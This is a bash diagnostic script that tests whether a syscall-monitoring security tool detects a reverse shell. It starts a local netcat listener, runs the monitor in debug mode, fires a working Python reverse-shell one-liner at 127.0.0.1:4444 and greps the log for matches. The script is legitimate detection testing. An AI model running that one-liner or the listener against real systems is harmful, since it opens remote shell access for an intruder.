#!/bin/bash
# Diagnostic test: trace Python reverse shell syscalls in detail
# Purpose: Find out WHY Grimoire isn't detecting the attack

set -e

echo "🔬 DIAGNOSTIC: Reverse Shell Detection Failure Analysis"
echo "══════════════════════════════════════════════════════"
echo ""

# Kill old processes
sudo pkill -9 zig-sentinel 2>/dev/null || true
sudo pkill -9 nc 2>/dev/null || true
sleep 1

cd /home/founder/github_public/guardian-shield

# Start listener in background
echo "1. Starting netcat listener on port 4444..."
nc -lvnp 4444 &
NC_PID=$!
sleep 1

# Start Guardian with Grimoire
echo "2. Starting Guardian with Grimoire debug mode..."
sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --duration=20 \
    > /tmp/guardian-diagnostic.log 2>&1 &
GUARDIAN_PID=$!

echo "3. Waiting for Guardian to initialize (5 seconds)..."
sleep 5

# Execute Python reverse shell attack
echo "4. Executing Python reverse shell attack..."
echo "   Command: socket() -> connect() -> dup2(0) -> dup2(1) -> dup2(2) -> execve(/bin/sh)"
echo ""

python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" &
ATTACK_PID=$!

echo "   Attack PID: $ATTACK_PID"
sleep 2

# Kill the attack process
kill -9 $ATTACK_PID 2>/dev/null || true
kill -9 $NC_PID 2>/dev/null || true

echo ""
echo "5. Waiting for Guardian to finish (10 more seconds)..."
sleep 10

# Kill Guardian
sudo kill -INT $GUARDIAN_PID 2>/dev/null || true
sleep 2

echo ""
echo "══════════════════════════════════════════════════════"
echo "ANALYSIS:"
echo ""

# Check if Grimoire saw the attack PID
echo "A. Did Grimoire see the attack PID ($ATTACK_PID)?"
grep -c "PID=$ATTACK_PID" /tmp/guardian-diagnostic.log && echo "   ✅ YES - Grimoire processed events from attack PID" || echo "   ❌ NO - Grimoire never saw this PID"

echo ""
echo "B. What patterns did Grimoire match?"
grep "GRIMOIRE-DEBUG.*SYSCALL_MATCH" /tmp/guardian-diagnostic.log | cut -d' ' -f2-4 | sort | uniq -c || echo "   (none)"

echo ""
echo "C. Did Grimoire see reverse_shell_classic pattern?"
grep -c "reverse_shell_classic" /tmp/guardian-diagnostic.log && echo "   ✅ YES" || echo "   ❌ NO"

echo ""
echo "D. What errors occurred?"
grep "processSyscall error" /tmp/guardian-diagnostic.log | sort | uniq -c || echo "   (none)"

echo ""
echo "E. Full debug output:"
grep "GRIMOIRE-DEBUG" /tmp/guardian-diagnostic.log || echo "   (no debug output)"

echo ""
echo "══════════════════════════════════════════════════════"
echo "Full log saved to: /tmp/guardian-diagnostic.log"
echo ""
